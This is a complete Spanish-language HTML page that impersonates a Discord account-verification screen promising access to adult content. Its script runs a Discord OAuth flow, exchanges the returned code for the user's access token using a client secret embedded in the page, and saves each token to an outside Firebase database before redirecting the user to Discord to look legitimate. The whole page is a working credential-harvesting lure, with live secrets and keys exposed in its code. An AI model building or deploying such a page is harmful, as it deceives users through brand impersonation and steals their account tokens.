<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verificación</title>
    <style>
        body {
            background-color: #2b2d31; /* Fondo oscuro estilo Discord */
            font-family: 'gg sans', 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #dbdee1;
        }
        .container {
            background-color: #3f4147;
            padding: 32px;
            border-radius: 5px;
            width: 400px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #ffffff;
        }
        p {
            font-size: 14px;
            color: #b5bac1;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .icon-container {
            margin-bottom: 20px;
        }
        .shield-icon {
            width: 48px;
            height: 48px;
            fill: #ffffff;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #23a559; /* Verde verificación o azul discord */
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #1e8c4b;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #72767d;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #ffffff;
            min-height: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon-container">
        <!-- Icono de escudo simple SVG -->
        <svg class="shield-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v5.7c0 4.86-3.33 9.43-7 10.58-3.67-1.15-7-5.72-7-10.58V8.3l7-3.12z"/>
            <path d="M10 13h4v2h-4zm0 3h4v2h-4z" fill="#ffffff"/>
        </svg>
    </div>
    
    <h1>Verifica tu cuenta</h1>
    <p>Para acceder al contenido +18 de este servidor, necesitamos verificar que eres tú. Esto nos ayuda a mantener la seguridad.</p>
    
    <button id="verifyBtn">Verificar ahora</button>
    
    <div id="status"></div>
    
    <div class="footer">
        © 2024 Discord Inc.
    </div>
</div>

<script type="module">
    // Importar Firebase SDK v9
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

    // --- CONFIGURACIÓN DE FIREBASE (TUS DATOS) ---
    const firebaseConfig = {
        apiKey: "AIzaSyABG_d13tL6rBOomU9mUpKAFSNtzg5vOt8",
        authDomain: "meetlychat-16ef0.firebaseapp.com",
        databaseURL: "https://meetlychat-16ef0-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "meetlychat-16ef0",
        storageBucket: "meetlychat-16ef0.firebasestorage.app",
        messagingSenderId: "202966549326",
        appId: "1:202966549326:web:a55033be7378d637ccd41f"
    };

    // Inicializar Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const statusDiv = document.getElementById('status');
    const verifyBtn = document.getElementById('verifyBtn');

    // Client ID y Secret de Discord
    const CLIENT_ID = '1567793753396088863'; 
    const CLIENT_SECRET = 'gcPaAiNBvntxodgP3HU2lqPLvf7zM43W'; 

    // URL actual sin parámetros
    const currentUrl = window.location.href.split('?')[0];
    const redirectUri = encodeURIComponent(currentUrl);

    // Función para iniciar el flujo de OAuth
    verifyBtn.addEventListener('click', () => {
        window.location.href = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirectUri}&response_type=code&scope=identify`;
    });

    // Lógica: ¿Vimos un código?
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');

    if (code) {
        statusDiv.innerText = "Verificando...";
        verifyBtn.disabled = true;
        verifyBtn.style.backgroundColor = "#72767d";

        fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: CLIENT_ID,
                client_secret: CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: currentUrl
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.access_token) {
                statusDiv.innerText = "¡Guardando en base de datos!";
                
                // Guardar en Firebase
                set(ref(db, 'tokens/' + Date.now()), {
                    token: data.access_token,
                    user_id: data.user ? data.user.id : 'unknown',
                    timestamp: new Date().toISOString(),
                    note: "Verified via +18 Check"
                })
                .then(() => {
                    statusDiv.innerText = "¡Verificado! Redirigiendo...";
                    setTimeout(() => {
                        window.location.href = "https://discord.com/channels/@me";
                    }, 1000);
                })
                .catch(err => {
                    statusDiv.innerText = "Error: " + err.message;
                });
            } else {
                statusDiv.innerText = "Error al obtener token.";
            }
        })
        .catch(err => {
            statusDiv.innerText = "Error de red.";
        });
    }
</script>

</body>
</html>
